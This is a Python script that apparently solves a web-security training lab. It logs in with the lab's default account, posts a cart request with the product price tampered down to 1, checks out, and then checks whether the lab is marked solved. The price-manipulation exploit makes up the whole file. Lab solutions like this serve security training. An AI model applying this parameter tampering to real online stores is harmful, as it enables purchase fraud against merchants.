import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}

def get_csrf_token(s, url, path):
    target_url = url + path
    r = s.get(target_url, headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value'] # type: ignore
    return csrf

def login_acc(s, url, path, username, password):
    login_url = url + path
    payload = {
        "csrf": get_csrf_token(s, url, path),
        "username": username,
        "password": password
    }
    r = s.post(login_url, data=payload, headers=headers)
    if 'Log out' in r.text:
        print(f'[+] Successful login {username} account')
    else:
        print(f'[-] Fail to login {username} account')
        sys.exit(-1)

def add_prod_to_cart(s, url, path):
    target_url = url + path
    payload = {
        'productId': 1,
        'redir': 'PRODUCT',
        'quantity': 2,
        'price': 1
    }
    r = s.post(target_url, data=payload, allow_redirects=False)

    if r.status_code == 302:
        print('[+] Success add product to cart')
    else:
        print('[-] Fail to add product to cart')
        sys.exit(-1)

def checkout_prod(s, url, path):
    target_url = url + path
    payload = { "csrf": get_csrf_token(s, url, '/cart') }
    r = s.post(target_url, data=payload, allow_redirects=True)

    if r.status_code == 200:
        print('[+] Success purched product')
    else:
        print('[-] Fail to purched product')
        sys.exit(-1)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]

    login_acc(s, url, '/login', 'wiener', 'peter')
    add_prod_to_cart(s, url, 'cart')
    checkout_prod(s, url, '/cart/checkout')
    check_solved_lab(s, url)

if __name__ == '__main__':
    main()